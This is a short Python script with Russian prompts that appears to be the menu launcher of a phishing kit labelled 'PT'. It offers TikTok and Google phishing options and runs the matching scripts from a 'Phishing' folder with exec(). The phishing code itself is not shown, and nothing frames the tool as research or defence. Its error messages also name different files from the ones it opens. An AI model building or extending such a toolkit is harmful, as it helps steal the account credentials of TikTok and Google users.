import os

print('1 - tiktok phishing')
print ('2 - google')

phish = input('Добро пожаловать на PT. Выбирите что вы хотите сделать: ')

if phish == '1':
    try:
        with open('Phishing/Tiktok.py', 'r', encoding='utf-8') as file:
            os.system('cls')
            exec(file.read())
    except FileNotFoundError:
        print("Файл 'Phishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")
if phish =='2':
    try:
        with open('Phishing/Google.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'GooglePhishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")
if phish == '3':
    exit()
